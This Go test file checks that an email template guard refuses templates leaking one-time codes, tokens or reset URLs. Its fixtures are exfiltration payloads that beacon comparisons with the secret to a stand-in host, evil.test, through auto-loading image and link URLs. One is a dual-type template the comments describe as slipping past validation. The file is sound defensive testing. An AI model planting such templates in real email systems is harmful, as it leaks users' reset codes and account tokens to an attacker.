package email

import (
	"strings"
	"testing"
)

// $.Code is a parse.VariableNode, not a FieldNode. nodeUsesSecret historically
// only walked FieldNode / ChainNode / PipeNode, so {{eq $.Code "000000"}} looked
// secret-free to refuseSecretControlFlow. Both canaries miss the probe,
// differential stays green, and checkEmailURL allows the constant https URL —
// the same one-bit auto-load oracle the .Code cases already refuse.
//
// {{template "name" .Code}} rebinds the callee's dot to the secret. A naive
// {{if eq . "000000"}} inside the define fails closed during validation because
// every associated body is also rendered alone under TemplateData (type error).
// A dual-type body that branches on printf "%T" executes cleanly under both
// shapes, looks constant across canaries, and beacons the live OTP — which is
// the payload this test pins.

func TestGuardRefusesDollarQualifiedSecretOracles(t *testing.T) {
	oracles := []struct {
		name string
		src  string
	}{
		{
			name: "eq $.Code emitted into img src",
			src:  `<p>Reset</p><img src="https://evil.test/c/{{eq $.Code "000000"}}">`,
		},
		{
			name: "ge $.Code binary-search in img src",
			src:  `<img src="https://evil.test/ge5/{{ge $.Code "500000"}}">`,
		},
		{
			name: "if eq $.Code branch",
			src:  `{{if eq $.Code "000000"}}<img src="https://evil.test/hit">{{end}}<p>x</p>`,
		},
		{
			name: "with $.Token then emit",
			src:  `{{with $.Token}}<img src="https://evil.test/t">{{end}}<p>x</p>`,
		},
		{
			name: "eq $.Token into href",
			src:  `<a href="https://evil.test/x/{{eq $.Token "nope"}}">Reset</a>`,
		},
		{
			name: "eq $.URL into img src",
			src:  `<img src="https://evil.test/u/{{eq $.URL "https://evil.test"}}">`,
		},
	}
	for _, tc := range oracles {
		t.Run(tc.name, func(t *testing.T) {
			err := guardTemplate([]byte(tc.src))
			if err == nil {
				t.Fatalf("guardTemplate ACCEPTED a $-qualified secret oracle: %s", tc.src)
			}
			if !strings.Contains(err.Error(), "derives") && !strings.Contains(err.Error(), "decides on the value") {
				t.Fatalf("refused for the wrong reason: %v", err)
			}
		})
	}
}

// Dual-type define: alone under TemplateData it emits "false"; called with the
// secret under canaries it also emits "false"; the live OTP "000000" emits
// "true" into an auto-loaded img src. Before the TemplateNode walk both of these
// passed guardTemplate and beaconed. The refusal is matched on the sentence the
// TemplateNode arm writes, because the bare word "template" appears in nearly
// every refusal this guard produces.
func TestGuardRefusesTemplateRebindOfSecret(t *testing.T) {
	const probe = `{{define "probe"}}{{if eq (printf "%T" .) "string"}}{{eq . "000000"}}{{else}}false{{end}}{{end}}`

	for _, tc := range []struct{ name, arg string }{
		{"field argument", ".Code"},
		{"dollar-rooted argument", "$.Code"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			src := probe + `<p>x</p><img src="https://evil.test/c/{{template "probe" ` + tc.arg + `}}">`
			err := guardTemplate([]byte(src))
			if err == nil {
				t.Fatalf("guardTemplate ACCEPTED a {{template}} that rebinds %s as dot: %s", tc.arg, src)
			}
			if !strings.Contains(err.Error(), "{{template}} call passes the link, token or code") {
				t.Fatalf("refused for the wrong reason (want the template-rebind refusal): %v", err)
			}
		})
	}
}

func TestGuardStillAllowsVerbatimDollarSecretActions(t *testing.T) {
	ok := []string{
		`<p>{{$.Code}}</p>`,
		`<p>{{$.Token}}</p>`,
		`<a href="{{$.URL}}">Reset</a>`,
		`<a href="{{$.URL | safeURL}}">Reset</a>`,
		`<p>{{$.Code | lower}}</p>`,
	}
	for _, src := range ok {
		if err := guardTemplate([]byte(src)); err != nil {
			t.Fatalf("guardTemplate rejected legitimate verbatim $-secret use %q: %v", src, err)
		}
	}
}
